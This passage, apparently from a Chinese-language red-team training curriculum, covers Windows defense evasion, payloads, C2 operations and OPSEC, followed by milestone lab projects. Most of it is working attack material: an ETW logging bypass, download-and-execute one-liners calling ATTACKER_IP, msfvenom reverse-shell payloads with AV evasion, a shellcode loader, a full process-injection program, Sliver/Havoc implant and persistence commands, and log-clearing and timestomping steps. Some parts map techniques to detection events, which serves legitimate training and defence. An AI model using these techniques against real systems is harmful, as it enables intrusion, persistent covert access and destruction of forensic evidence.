$EP = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$FF = $EP.GetField('etwProvider','NonPublic,Static')
$ETP = $FF.GetValue($null)
$F.SetValue($ETP, 0)
# 本会话的 PowerShell ScriptBlock 日志记录现已禁用

# 或者：单行命令（更易被检测，但更简单）
[System.Diagnostics.Eventing.EventProvider].GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)
```

---

### 10.3 内存中执行 - 绝不接触磁盘

```powershell
# 直接从攻击机的 Web 服务器加载 PowerShell 工具：
# 先运行上面的 AMSI 和 ETW 绕过，然后：

# 加载 PowerView：
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# 加载 PowerSharpPack（为内存中执行而编译的 C# 工具合集）：
# https://github.com/S3cur3Th1sSh1t/PowerSharpPack
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerSharpPack.ps1')
Invoke-Rubeus -Command "kerberoast /format:hashcat"
Invoke-SharpHound -Command "-c All"
Invoke-Mimikatz

# 从 HTTPS 加载（如果 HTTP 被过滤，搭建 HTTPS 服务器）：
# 在攻击机上：python3 -m http.server 8443 --certfile cert.pem
IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER_IP:8443/tool.ps1')

# 从 Kali 提供文件（快速搭建）：
sudo python3 -m http.server 80           # HTTP
sudo python3 -m http.server 443          # 在 443 端口提供 HTTP（不是 HTTPS，但有用）

# 更好：用正式的 Web 服务器：
sudo service apache2 start
cp tool.ps1 /var/www/html/
```

---

### 10.4 面向 Defender 的载荷生成

标准的 `msfvenom` 输出会在几秒内被 Windows Defender 标记。下面说明如何生成能存活下来的载荷。

```bash
# 第 1 步：检查你的载荷命中了哪些特征
# 安装 VirusTotal CLI，或手动上传到 https://www.virustotal.com
# 绝不要把真实行动载荷上传到 VT（它会与 AV 厂商共享）
# 使用私密 AV 扫描器：https://antiscan.me

# 第 2 步：简单的 msfvenom 编码（能绕过旧 AV，但绕不过现代 Defender）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -e x64/xor_dynamic -i 10 -o payload.exe
# -e：编码器    -i：迭代次数

# 第 3 步：基于模板的可执行文件（把载荷嵌入合法二进制）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -x /usr/share/windows-binaries/whoami.exe -k -f exe -o payload.exe
# -x：用合法二进制作为模板    -k：保留原有功能

# 第 4 步：基于 Python 的载荷混淆（对静态检测更有效）
# 安装：pip3 install pyinstaller
cat > payload.py << 'EOF'
import socket, subprocess, os, base64

# 运行时对 shellcode 做 XOR 解码（不以明文字节存储）
encoded = b"ENCODED_SHELLCODE_HERE"
key = 0x41
decoded = bytes([b ^ key for b in encoded])

import ctypes
buf = ctypes.create_string_buffer(decoded)
fn = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))
fn()
EOF
pyinstaller --onefile --noconsole payload.py

# 第 5 步：shellcode 加载器（2026-2027 年更可靠）
# 最有效的方法：写一个自定义 C/C++ 加载器
# 见第 11 节（C2 框架）：Sliver 和 Havoc 原生生成规避型植入体

# 第 6 步：Invoke-Obfuscation（PowerShell 载荷混淆）
# https://github.com/danielbohannon/Invoke-Obfuscation
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Obfuscation.ps1')
Invoke-Obfuscation
# TOKEN\ALL\1 或 LAUNCHER\PS\12288 是很好的入门混淆组合
```

---

### 10.5 进程注入 - 在另一个进程中运行代码

进程注入把你的 shellcode 放到一个合法进程（explorer.exe、notepad.exe、svchost.exe）中执行。恶意活动看起来像是来自受信任的进程。

```c
// classic_inject.cpp
// 通过 VirtualAllocEx + WriteProcessMemory + CreateRemoteThread 把 shellcode 注入远程进程
// 编译：x86_64-w64-mingw32-g++ classic_inject.cpp -o inject.exe -lpsapi

#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f c
// 在此粘贴 shellcode 数组：
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0  // 已截断 - 替换为实际 shellcode
};
SIZE_T shellcode_len = sizeof(shellcode);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);

    // 以必要权限打开目标进程
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid
    );
    if (!hProc) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return 1;
    }

    // 在目标进程中分配内存
    LPVOID pRemoteMem = VirtualAllocEx(
        hProc,
        NULL,
        shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 把 shellcode 写入已分配内存
    SIZE_T written;
    WriteProcessMemory(hProc, pRemoteMem, shellcode, shellcode_len, &written);

    // 在目标进程中创建线程执行 shellcode
    HANDLE hThread = CreateRemoteThread(
        hProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteMem,
        NULL,
        0,
        NULL
    );

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProc);

    printf("Injected %zu bytes into PID %d\n", shellcode_len, pid);
    return 0;
}
```

```bash
# 在 Kali 上编译：
x86_64-w64-mingw32-g++ classic_inject.cpp -o inject.exe -lpsapi

# 找到合适的目标进程 PID：
# 在目标 Windows 上：tasklist | findstr explorer
# 或者：Get-Process explorer | Select-Object Id

# 用法：
.\inject.exe 1234    # 把 1234 替换为 explorer.exe 的 PID

# 更隐蔽的注入技术：QueueUserAPC（Early Bird 注入）
# 注入到新的挂起进程：绕过许多 EDR 钩子
# 参考：https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
```

**检测痕迹：**
- VirtualAllocEx 使用 `PAGE_EXECUTE_READWRITE`：Sysmon 事件 ID 8（CreateRemoteThread）
- 对另一个进程调用 WriteProcessMemory：进程访问审核
- Sysmon 事件 ID 1 中异常的父子进程关系

---

### 10.6 就地取材 - LOLBins

```powershell
# certutil.exe：文件下载
certutil.exe -urlcache -split -f http://ATTACKER_IP/payload.exe C:\Temp\payload.exe

# bitsadmin.exe：后台文件下载
bitsadmin /transfer "job1" http://ATTACKER_IP/payload.exe C:\Temp\payload.exe

# regsvr32.exe：从 URL 执行脚本（squiblydoo）
regsvr32.exe /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

# mshta.exe：从 URL 执行 HTA
mshta.exe http://ATTACKER_IP/payload.hta

# wscript.exe：执行 JScript（在某些环境中比 PowerShell 更不易被检测）
wscript.exe //e:jscript //nologo payload.js

# 完整 LOLBAS 参考：https://lolbas-project.github.io/
# 完整 GTFOBins 参考：https://gtfobins.github.io/
```

---

### 10.7 分阶段与无阶段载荷

```bash
# 无阶段：整个载荷都在二进制中（更大、无需回连、更适合受限网络）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o stageless.exe

# 分阶段：小的 stager 从你的监听器下载其余部分（更小、需要网络回连）
msfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o staged.exe
# 注意：shell_reverse_tcp = 无阶段，shell/reverse_tcp = 分阶段（斜杠很重要）

# 分阶段载荷需要 Metasploit 的 multi/handler：
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit -j

# 何时用哪种：
# 无阶段：目标出站受限，或你希望单文件简单省事
# 分阶段：小 stager 更容易规避 AV（代码更少 = 特征更少）
# 实战使用：C2 框架植入体（第 11 节）比两者都好
```

---

---

## 第 11 节：C2 框架操作

### 这是什么，为什么重要

C2（命令与控制）框架取代你一直使用的原始反弹 shell。当 shell 因网络超时或重启而断掉时，你的访问就没了。C2 植入体会自动重连、通过持久化在重启后存活、加密其流量，并给你一个丰富的操作员界面来同时管理多个目标。

2026-2027 年，操作员的标准配置就是 C2 框架。其他都只是侦察。

### C2 架构

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/10._C2_Architecture.png" alt="C2 Architecture" width="1200"/>

</td></tr></table>
</div>

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [Sliver C2 Documentation](https://sliver.sh/docs) | 文档 | 5 小时 | 免费 | 完整文档。全部读完。 |
| [Havoc Framework Documentation](https://havocframework.com/docs/) | 文档 | 5 小时 | 免费 | 最现代的规避型 C2。中等难度。 |
| [C2 Matrix](https://www.thec2matrix.com/) | 参考 | 2 小时 | 免费 | 对比所有主流 C2 框架。 |
| [RedTeaming - Adversary Simulation](https://github.com/jnahmias/Red-Teaming-TTPs) | 参考 | 持续更新 | 免费 | 红队 TTP，包括 C2 战术。 |

---

### 11.1 Sliver C2 - 入门

Sliver 是 BishopFox 开发的开源 C2 框架，用 Go 编写，可生成 Go、C/C++ 或 shellcode 形式的植入体。截至 2026 年，它是操作员使用最广泛的开源 C2 框架。

```bash
# 在攻击机（或 VPS）上安装 Sliver：
# https://github.com/BishopFox/sliver

# 快速安装：
curl https://sliver.sh/install | sudo bash

# 启动 Sliver 服务器：
sudo sliver-server

# 这会启动两样东西：
# 1. 操作员界面（CLI）
# 2. gRPC 监听器（供操作员连接）
# 首次运行会生成证书和配置

# 以操作员身份连接（在同一台机器上：自动）：
sliver

# 你现在进入了 Sliver 控制台：
sliver >
```

---

### 11.2 创建监听器

```bash
# 在 Sliver 控制台中：

# HTTPS 监听器（最常见：混入 Web 流量）：
sliver > https -L 0.0.0.0 -l 443

# HTTP 监听器：
sliver > http -L 0.0.0.0 -l 80

# mTLS 监听器（双向 TLS：最安全，用于不经过 CDN 的植入体）：
sliver > mtls -L 0.0.0.0 -l 8888

# DNS 监听器（用于基于 DNS 的 C2：绕过大多数防火墙）：
# 需要：你控制的域名，且有一条指向 C2 服务器的 NS 记录
sliver > dns -d your-c2-domain.com

# 列出活动监听器：
sliver > jobs
```

---

### 11.3 生成植入体

```bash
# 在 Sliver 控制台中：

# 生成 Windows HTTPS 植入体（无阶段，可执行文件）：
sliver > generate --os windows --arch amd64 --format exe \
  --http ATTACKER_IP:443 --name "update_service" --save /tmp/
# 输出：/tmp/update_service.exe

# 生成 Linux 植入体：
sliver > generate --os linux --arch amd64 --format elf \
  --http ATTACKER_IP:443 --name "cron_worker" --save /tmp/

# 生成 shellcode（用于进程注入）：
sliver > generate --os windows --arch amd64 --format shellcode \
  --http ATTACKER_IP:443 --name "shellcode_beacon" --save /tmp/

# 生成共享库（用于 DLL 注入）：
sliver > generate --os windows --arch amd64 --format shared \
  --http ATTACKER_IP:443 --name "evil" --save /tmp/

# 规避选项：
sliver > generate --os windows --arch amd64 --format exe \
  --http ATTACKER_IP:443 \
  --evasion \              # 启用规避功能（混淆、反分析）
  --skip-symbols \         # 剥离调试符号
  --name "svchost_update" \
  --save /tmp/

# 列出已生成的植入体：
sliver > implants
```

---

### 11.4 通过 Sliver 操作

```bash
# 把植入体传到目标并执行
# （用你手头的任何初始访问方式：SMB、WinRM、RDP 等）

# 植入体回连后，在 Sliver 控制台中：
sliver > sessions
# 显示：ID、Name、Transport、RemoteAddress、Hostname、Username、OS、LastCheck

# 与某个会话交互：
sliver > use SESSION_ID
# 或者：sliver > sessions -i SESSION_ID

# 你现在进入了一个植入体会话：
[update_service] sliver (VICTIM-PC) >

# 基础命令：
whoami
hostname
getpid                       # 植入体进程的 PID
getuid                       # 当前用户与权限
ps                           # 列出运行中的进程
ls C:\Users\                 # 列出目录
cat C:\Users\Admin\Desktop\flag.txt
download C:\Users\Admin\Desktop\important.docx /tmp/
upload /tmp/tool.exe C:\Temp\tool.exe

# Shell 访问：
shell                        # 交互式 cmd.exe shell（噪音大）
execute -o cmd /c whoami     # 单条命令，返回输出

# PowerShell：
execute-assembly /path/to/Assembly.exe [args]
# 在内存中运行 .NET 程序集：不写文件到磁盘

# 通过会话加载 PowerShell 脚本：
execute -o powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/amsi_bypass.ps1')"

# 跳板：用该植入体作为 SOCKS 代理，到达其内部网络：
socks5 start -P 1080
# 然后配置 proxychains 使用 127.0.0.1:1080

# 通过植入体做端口转发：
portfwd add --remote INTERNAL_IP:445 --local 127.0.0.1:1445

# 提权（如果你有提权路径）：
getsystem                    # 尝试自动化提权到 SYSTEM（组合多种技术）
```

---

### 11.5 通过 C2 持久化

```bash
# 在目标上的 Sliver 会话中：

# 注册表 Run 键持久化：
registry write --hive HKCU \
  --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
  --value "WindowsUpdate" \
  --type string \
  --data "C:\\ProgramData\\update_service.exe"

# 基于服务的持久化（需要 SYSTEM 或管理员）：
services create --name "WindowsUpdater" \
  --description "Windows Update Service Helper" \
  --exe-path "C:\\ProgramData\\update_service.exe" \
  --start-type automatic

# 计划任务持久化：
execute -o schtasks /create /tn "WindowsUpdater" /tr "C:\ProgramData\update_service.exe" /sc onlogon /ru SYSTEM /f
```

---

### 11.6 Havoc C2 - 进阶选项

Havoc 比 Sliver 更进阶，专为现代规避而设计。等你用熟了 Sliver 再用它。

```bash
# 安装 Havoc：
# https://github.com/HavocFramework/Havoc
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# 安装依赖：
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev \
  libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev \
  libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev \
  qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
  qtdeclarative5-dev golang-go nasm

# 编译：
cd teamserver && go mod download && go build . && cd ..
cd client && mkdir build && cd build && cmake .. && make -j4 && cd ../..

# 启动团队服务器：
./havoc server --profile ./profiles/havoc.yaotl

# 用客户端连接（图形界面）：
./havoc client

# Havoc 相比 Sliver 的优势：
# - Demon 植入体用 C 编写：比基于 Go 的植入体更隐蔽
# - 植入体内置 AMSI/ETW 补丁
# - 调用栈伪造（对内存扫描器隐藏恶意调用栈）
# - 休眠加密（在回连间隔加密植入体内存）
# - 更可定制的规避配置

# 在 Havoc 图形界面生成 Demon 植入体：
# Payloads -> Generate -> Demon
# 设置：Listener、Architecture (x64)、Format (Windows EXE)
# 启用：AMSI/ETW Patch、Sleep Encryption、Stack Spoofing
```

---

---

## 第 12 节：阶段 2 中的 OPSEC

### 这是什么，为什么重要

OPSEC（操作安全）意味着理解你在目标系统上留下的每一条痕迹，并管理这些痕迹以保持在检测阈值之下。理解你留下了什么，不只是为了在行动中避免被发现：更是为了理解防守方在事后取证调查中会发现什么。

### 自我验证：在实验环境中配置 Sysmon

**这是强制性的。** 你不能靠盲信痕迹描述来学会实战 OPSEC。你必须在你自己的实验环境中亲眼看到它们。

```bash
# 在你的 Windows 实验机器上安装 Sysmon（Sysinternals）：
# 下载：https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
# 下载 Sysmon 配置（SwiftOnSecurity：最好的起步配置）：
# https://github.com/SwiftOnSecurity/sysmon-config

# 在 Windows 受害机上安装（以管理员身份运行）：
.\sysmon64.exe -accepteula -i sysmonconfig-export.xml

# 查看 Sysmon 事件：
# 事件查看器 -> 应用程序和服务日志 -> Microsoft -> Windows -> Sysmon -> Operational

# 或用 PowerShell 查询：
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 10} |   # 事件 ID 10 = ProcessAccess（LSASS 转储告警）
  Select-Object TimeCreated, Message |
  Format-List

# 需要理解的关键 Sysmon 事件：
# 事件 ID 1：进程创建（带完整命令行的新进程）
# 事件 ID 3：网络连接（进程的出站连接）
# 事件 ID 7：映像加载（DLL 加载）
# 事件 ID 8：CreateRemoteThread（进程注入告警）
# 事件 ID 10：ProcessAccess（一个进程读取另一个：LSASS 转储告警）
# 事件 ID 11：FileCreate（磁盘上的新文件）
# 事件 ID 12：RegistryEvent（注册表键创建/删除）
# 事件 ID 13：RegistryValue（注册表值设置：Run 键）

# 现在运行你的技术，观察会出现什么：
# 运行 psexec -> 在系统日志中看到事件 ID 7045（服务安装）+ Sysmon ID 1
# 转储 LSASS -> 立刻看到 Sysmon ID 10
# 投放 WinPEAS -> 看到 Sysmon ID 11，然后是 Defender 告警
# 修改 Run 键 -> 看到 Sysmon ID 13
# 这会用实证训练你的 OPSEC 直觉
```

---

### 12.1 技术到痕迹对照表

| 技术 | 目标痕迹 | 日志位置 |
|-----------|----------------|--------------|
| psexec | 创建 `PSEXESVC` 服务 | 系统日志：事件 ID 7045 |
| wmiexec | `WmiPrvSE.exe` 启动 `cmd.exe` | Sysmon 事件 ID 1 |
| evil-winrm | `wsmprovhost.exe` 进程 | 事件 ID 4624 类型 3、Sysmon ID 1 |
| 通过 ProcDump 转储 LSASS | 磁盘上的 `lsass.dmp` + 进程访问 | Sysmon 事件 ID 10 |
| Responder | ARP 缓存投毒条目 | 交换机 ARP 日志、WIDS |
| ntlmrelayx | 短暂的 SMB 管理连接 | 中继目标上的事件 ID 4624 |
| mimikatz | `privilege::debug` | 事件 ID 4673（敏感特权使用） |
| BloodHound SharpHound | 发往 DC 的 LDAP 查询 | DC 上的事件 ID 1644 |
| 创建计划任务 | 计划任务 Operational 日志 | 事件 ID 4698 |
| 注册表 Run 键 | HKLM/HKCU Run 键被修改 | 事件 ID 4657（如果启用对象审核） |
| netsh portproxy | 注册表键被写入 | HKLM\SYSTEM\CurrentControlSet\Services\PortProxy |
| 磁盘上的 WinPEAS | 投放的二进制文件 | Windows Defender + Sysmon ID 11 |
| 植入 SSH 密钥 | `authorized_keys` 被修改 | auditd 系统调用日志 |
| certipy find | 针对证书模板的 LDAP 查询 | DC 上的事件 ID 1644 |
| 添加影子凭据 | msDS-KeyCredentialLink 被修改 | 事件 ID 5136 |
| ACL 修改 | AD 对象 ACL 被修改 | 事件 ID 5136 |

---

### 12.2 减少痕迹的技术

```powershell
# 用内存代替磁盘：
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/tool.ps1')
# 对比下载到磁盘再运行（两次检测 vs 一次）

# 优先用 wmiexec 而非 psexec：
impacket-wmiexec domain/user:pass@TARGET_IP
# 不创建服务。更安静。大多数环境中 WMI 流量是正常现象。

# 清除 PowerShell 历史：
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force

# 清除 Windows 事件日志（如果有 SYSTEM：这本身会产生事件 ID 1102）：
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
# 警告：实时 SIEM 采集意味着在你清除之前，这些数据已经上传。
# 清除日志对防守方来说是高置信度的失陷指标。

# 为本次会话禁用 PowerShell 历史：
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# 清除 Linux 历史：
unset HISTFILE
export HISTSIZE=0
history -c
cat /dev/null > ~/.bash_history

# 时间戳伪造（让文件时间戳与周围文件一致）：
# Linux：
touch -t 202001010000 /tmp/payload.sh
# PowerShell：
$file = Get-Item "C:\Temp\payload.exe"
$file.CreationTime = "2020-01-01 08:00:00"
$file.LastWriteTime = "2020-01-01 08:00:00"
$file.LastAccessTime = "2020-01-01 08:00:00"
```

---

### 12.3 就地取材（完整参考）

```powershell
# 使用 Windows 内置二进制，而不是投放自定义工具。
# EDR 产品会标记未知二进制。它们无法直接标记 certutil.exe：
# 它们标记的是 certutil.exe 做了什么。

certutil.exe -urlcache -split -f http://ATTACKER_IP/payload.exe C:\Temp\payload.exe
bitsadmin /transfer "job1" http://ATTACKER_IP/payload.exe C:\Temp\payload.exe
regsvr32.exe /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll
mshta.exe http://ATTACKER_IP/payload.hta

# 完整 LOLBAS 参考：https://lolbas-project.github.io/
```

---

---

## 里程碑项目

### 里程碑 1：完整的网络渗透测试报告

**范围：** 你的本地实验网络（至少 3 台机器）
**时间线：** 第 8-12 周
**交付物：** 一份按下述格式撰写的渗透测试报告

```markdown
# 网络渗透测试报告

## 执行摘要
目标：[实验网络名称]
日期：[日期范围]
测试人员：[你的名字]
范围：[测试的 IP 段 / 主机]

### 风险摘要
| 严重性 | 数量 |
|----------|-------|
| 严重 | X |
| 高     | X |
| 中   | X |
| 低      | X |

## 技术发现

### 发现 1：[漏洞名称]
| 字段 | 详情 |
|-------|--------|
| 严重性 | 严重 / 高 / 中 / 低 |
| CVSS 评分 | X.X |
| 受影响主机 | 192.168.1.X |
| 服务 | SMB / SSH / HTTP / 等 |

**描述：** [漏洞是什么：2-3 句话]

**复现步骤：**
1. [确切命令]
2. [确切命令]
3. [观察到的结果]

**证据：** [命令输出或截图说明]

**影响：** [攻击者能做什么。业务影响。]

**修复建议：** [具体修复：升级到哪个版本、修改哪项配置]

## 攻击链
第 1 步：[在机器/服务上的操作]
第 2 步：[提权或横向移动]
第 N 步：[达成最终目标]

## 生成的痕迹
[列出测试期间创建的每条事件日志记录、文件或注册表键]
```

---

### 里程碑 2：自定义权限提升扫描器

**时间线：** 第 12-16 周
**交付物：** 两个可用的脚本

#### Linux 提权扫描器

```bash
#!/bin/bash
# linux_privesc_check.sh
# 用法：bash linux_privesc_check.sh | tee /tmp/privesc_out.txt

RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

DIVIDER="============================================"

header() { echo -e "\n${CYAN}${DIVIDER}\n $1\n${DIVIDER}${NC}"; }
finding() { echo -e "${RED}[!] $1${NC}"; }
info() { echo -e "${YELLOW}[*] $1${NC}"; }
ok() { echo -e "${GREEN}[+] $1${NC}"; }

echo "${DIVIDER}"
echo " Linux PrivEsc Checker"
echo " Host: $(hostname) | User: $(whoami) | Date: $(date)"
echo "${DIVIDER}"

header "KERNEL VERSION"
uname -a
cat /etc/os-release | grep PRETTY_NAME

header "CURRENT USER CONTEXT"
id
echo ""
info "Groups:"
groups

header "SUDO RULES"
sudo -l 2>/dev/null || echo "No sudo access"

header "SUID BINARIES: CHECK EACH AT GTFOBINS"
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
if [ -n "$SUID_BINS" ]; then
    finding "SUID binaries found:"
    echo "$SUID_BINS"
else
    ok "No unusual SUID binaries found"
fi

header "CAPABILITIES"
CAP_BINS=$(getcap -r / 2>/dev/null)
if [ -n "$CAP_BINS" ]; then
    finding "Capabilities found:"
    echo "$CAP_BINS"
else
    ok "No binaries with dangerous capabilities"
fi

header "/ETC/PASSWD WRITABLE?"
ls -la /etc/passwd
[ -w /etc/passwd ] && finding "/etc/passwd IS WRITABLE: exploit immediately" || ok "Not writable"

header "CRON JOBS"
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null
echo "--- /etc/cron.d/ ---"
ls -la /etc/cron.d/ 2>/dev/null
echo "--- User crontab ---"
crontab -l 2>/dev/null || echo "No user crontab"

header "WRITABLE SCRIPTS IN SYSTEM PATHS"
find /etc /opt /usr/local -writable -name "*.sh" 2>/dev/null | while read f; do
    finding "Writable script: $f"
done

header "NFS EXPORTS"
cat /etc/exports 2>/dev/null && echo "" || ok "No NFS exports"

header "INTERESTING FILES: POTENTIAL CREDENTIALS"
find /home /opt /var/www /tmp /root -name "*.txt" 2>/dev/null | \
  xargs grep -l -i "pass\|secret\|token\|key\|credential" 2>/dev/null | while read f; do
    finding "Interesting file: $f"
done

header "SSH KEYS"
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read k; do
    finding "Private key found: $k"
done
find / -name "authorized_keys" 2>/dev/null

header "INTERNAL SERVICES (listening locally only)"
ss -tulpn 2>/dev/null | grep "127.0.0.1"

header "ENVIRONMENT VARIABLES"
env | grep -iE "pass|key|secret|token|api|credential"

header "RECENTLY MODIFIED FILES (last 7 days)"
find / -mtime -7 -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run | head -30

header "SCAN COMPLETE"
echo "Review RED [!] findings first."
echo "Cross-reference every SUID/sudo finding with GTFOBins: https://gtfobins.github.io/"
echo "Kernel version: $(uname -r)"
echo "Check against DirtyPipe (CVE-2022-0847: kernels 5.8-5.16.10)"
echo "Check against GameOver(lay) (CVE-2023-2640/CVE-2023-32629: Ubuntu-specific)"
```

#### Windows 提权扫描器

```powershell
# windows_privesc_check.ps1
# 用法：powershell -ExecutionPolicy Bypass -File windows_privesc_check.ps1

function Write-Header { param($text)
    Write-Host "`n============================================" -ForegroundColor Cyan
    Write-Host " $text" -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
}
function Write-Finding { param($text) Write-Host "[!] $text" -ForegroundColor Red }
function Write-Info    { param($text) Write-Host "[*] $text" -ForegroundColor Yellow }
function Write-OK      { param($text) Write-Host "[+] $text" -ForegroundColor Green }

Write-Header "Windows PrivEsc Checker"
Write-Info "Host: $env:COMPUTERNAME | User: $env:USERNAME | Domain: $env:USERDOMAIN"

Write-Header "TOKEN PRIVILEGES: READ THIS FIRST"
whoami /priv
Write-Finding "SeImpersonatePrivilege -> GodPotato: https://github.com/BeichenDream/GodPotato"
Write-Finding "SeDebugPrivilege -> LSASS dump -> domain creds"
Write-Finding "SeBackupPrivilege -> dump SAM+SYSTEM -> all local hashes"

Write-Header "UNQUOTED SERVICE PATHS"
$services = Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch '^C:\\Windows' -and
    $_.PathName -match ' '
}
if ($services) {
    Write-Finding "UNQUOTED SERVICE PATHS:"
    $services | Select-Object Name, PathName, StartMode | Format-Table -AutoSize
} else { Write-OK "No unquoted service paths found" }

Write-Header "ALWAYSINSTALLELEVATED"
$hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
  -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
  -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hkcu -eq 1 -and $hklm -eq 1) {
    Write-Finding "AlwaysInstallElevated ENABLED: generate malicious MSI for SYSTEM"
} else { Write-OK "AlwaysInstallElevated not set" }

Write-Header "STORED CREDENTIALS"
cmdkey /list
Write-Info "If entries above exist: runas /savedcred /user:DOMAIN\user cmd.exe"

Write-Header "INTERESTING FILES: POTENTIAL CREDENTIALS"
$paths = @(
    "C:\Users\*\Desktop\*.txt",
    "C:\Users\*\Documents\*.txt",
    "C:\inetpub\wwwroot\web.config",
    "C:\*.txt", "C:\*.xml", "C:\*.conf", "C:\*.ini"
)
foreach ($p in $paths) {
    Get-Item $p -ErrorAction SilentlyContinue | ForEach-Object {
        if (Select-String -Path $_.FullName -Pattern "pass|password|key|secret|credential" `
          -Quiet -ErrorAction SilentlyContinue) {
            Write-Finding "Possible credentials in: $($_.FullName)"
        }
    }
}

Write-Header "SCHEDULED TASKS"
schtasks /query /fo LIST /v 2>$null |
  Select-String -Pattern "Task Name|Run As User|Task To Run|Status" |
  Where-Object { $_ -notmatch "^$" }

Write-Header "UAC STATUS"
$uacKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Write-Info "EnableLUA: $($uacKey.EnableLUA) (0 = UAC disabled, already elevated)"
if ($uacKey.EnableLUA -eq 0) { Write-Finding "UAC is DISABLED: no bypass needed" }

Write-Header "DLL HIJACKING"
Write-Info "Run Process Monitor with filter: Result = NAME NOT FOUND, Path ends .dll"
Write-Info "This scanner cannot replicate procmon. Run it manually."

Write-Header "REGISTRY RUN KEYS (Persistence check)"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue

Write-Header "SCAN COMPLETE"
Write-Info "Review RED [!] findings immediately."
Write-Info "For SeImpersonatePrivilege: run GodPotato https://github.com/BeichenDream/GodPotato"
Write-Info "For every unquoted path: icacls the writable segment to confirm write access."
```

---

### 里程碑 3：启用 C2 的横向移动链

**时间线：** 第 20-24 周
**实验环境：** 攻击机 + DC + 至少 2 台 Windows 受害机（都在同一虚拟网络上）

```markdown
# C2 横向移动链 - 实验文档

## 实验环境
| 机器 | IP | 操作系统 | 角色 |
|---------|----|-----|------|
| 攻击机 | 192.168.56.10 | Kali Linux | 攻击机、Sliver C2 |
| 受害机-1 | 10.10.10.20 | Windows 10 | 初始立足点 |
| DC | 10.10.10.10 | Windows Server 2022 | 域控制器 |

## 第 1 步：侦察
命令：[nmap 命令]
发现：[哪些端口开放]

## 第 2 步：初始访问
机器：Victim-1（10.10.10.20）
方法：[服务漏洞利用 / 密码喷洒 / 等]
命令：[确切命令]
结果：[shell 类型、用户上下文]
证据：[输出片段]
生成的痕迹：[目标上的事件 ID]

## 第 3 步：AMSI 绕过与工具加载
使用的绕过：[哪种方法，为什么]
在内存中加载的工具：[PowerView、Rubeus 等]
验证：[你如何确认绕过生效]

## 第 4 步：在 Victim-1 上提权
起始上下文：[用户、完整性级别]
目标：NT AUTHORITY\SYSTEM
方法：[哪种技术]
命令：[确切命令]
证据：[whoami /groups 输出]
生成的痕迹：[事件 ID]

## 第 5 步：凭据收集
